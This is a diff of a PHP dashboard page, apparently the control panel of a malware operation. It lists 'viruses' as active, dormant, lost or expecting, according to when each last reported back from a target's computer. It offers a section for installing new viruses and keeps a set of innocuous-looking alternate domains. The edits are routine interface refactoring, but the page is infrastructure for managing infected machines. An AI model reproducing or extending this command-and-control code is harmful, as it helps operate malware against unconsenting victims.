@@ -14,9 +14,8 @@ global $authenticator, $session, $userFactory, $virusFactory, $timezone, $demos;
 
 function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user, Timezone $timezoneObject) {
     $timezone = $user->getTimezone();
-    if (count($virus_ids) === 0) { ?>
-        <p>(No viruses)</p>
-    <?php } else { ?>
+    if (count($virus_ids) === 0) echo "<p>(No viruses)</p>";
+    else { ?>
         <div style="overflow: auto" class="w3-card table-round">
             <table class="w3-table w3-bordered w3-hoverable">
                 <tr class="w3-white table-heads"><?php
@@ -29,7 +28,9 @@ function displayTable(array $virus_ids, array $visibleFields, VirusFactory $viru
                 </tr>
                 <?php foreach ($virus_ids as $blob) {
                     $virus = $virusFactory->get($blob["virus_id"]);
-                    echo "<tr onclick = \"virusInfo('" . $virus->getVirusId() . "')\" style='cursor: pointer;' " . ($virus->isStandalone() ? "" : "class='w3-blue-grey w3-hover-dark-grey'") . ">";
+                    $virus_id = $virus->getVirusId();
+                    $extras = $virus->isStandalone() ? "" : "class='w3-blue-grey w3-hover-dark-grey'";
+                    echo "<tr onclick = \"virusInfo(event, '$virus_id')\" style='cursor: pointer;' $extras>";
                     echo in_array(0, $visibleFields) ? "<td>" . $virus->getName() . "</td>" : "";
                     echo in_array(1, $visibleFields) ? "<td>" . formattedHash($virus->getVirusId()) . "</td>" : "";
                     echo in_array(2, $visibleFields) ? "<td>" . $timezoneObject->display($timezone, $virus->getLastPing()) : "";
@@ -47,14 +48,13 @@ if (!$authenticator->authenticated()) {
     Header::redirect();
 }
 
-$user_handle = $session->get("user_handle");
-$user = $userFactory->get($user_handle);
+$user = $userFactory->currentChecked();
 $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
 $alts = ["cdn.simulationdemos.com", "graph.simulationdemos.com", "cdn.notescapture.com", "cdn.engr113.com", "cloud.engr113.com", "sr71.engr113.com"];
 ?>
 <html lang="en_US">
 <head>
-    <title>Dashboard</title>
+    <title>Dashboard - Virs</title>
     <?php HtmlTemplate::header($user->isDarkMode()); ?>
     <style>
         .codes {
@@ -83,30 +83,27 @@ if ($user->isHold()) { ?>
 <h2>Active viruses</h2>
 <p>These are viruses that are still reporting back pretty quickly (less
     than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
 <h2>Dormant viruses</h2>
 <p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
     than 2 days</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
 <h2>Lost viruses</h2>
 <p>These are viruses that don't report back for more than 2 days</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
 <h2>Expecting viruses</h2>
 <p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
     triggered by installing a new virus.</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user, $timezone); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user, $timezone,); ?>
 <h2>Installing a new virus</h2>
 <?php $demos->renderDashboard(); ?>
 </body>
 <?php HtmlTemplate::scripts(); ?>
 <script type="application/javascript">
     let clickHold = false; // prevent the delete button click from triggering the tr click
-    let ctrlIsPressed = false;
-    $(document).keydown(event => (event.which === 17 ? (ctrlIsPressed = true) : 0));
-    $(document).keyup(() => ctrlIsPressed = false);
-    let virusInfo = (virus_id) => {
+    let virusInfo = (event, virus_id) => {
         if (clickHold) return clickHold = false;
-        if (ctrlIsPressed) window.open("<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id, "_blank");
+        if (event.ctrlKey) window.open("<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id, "_blank");
         else window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id;
     }
     let deleteVirus = (virus_id) => (clickHold = true, $.ajax({
@@ -114,11 +111,6 @@ if ($user->isHold()) { ?>
         success: () => window.location = "<?php echo DOMAIN; ?>",
         error: () => toast.displayOfflineMessage("Can't delete virus!")
     }));
-    let removeHold = () => $.ajax({
-        url: "<?php echo DOMAIN_CONTROLLER; ?>/removeHold", type: "POST",
-        success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>",
-        error: () => toast.displayOfflineMessage("Can't remove hold.")
-    });
     let applyHold = () => $.ajax({
         url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold", type: "POST",
         success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>",
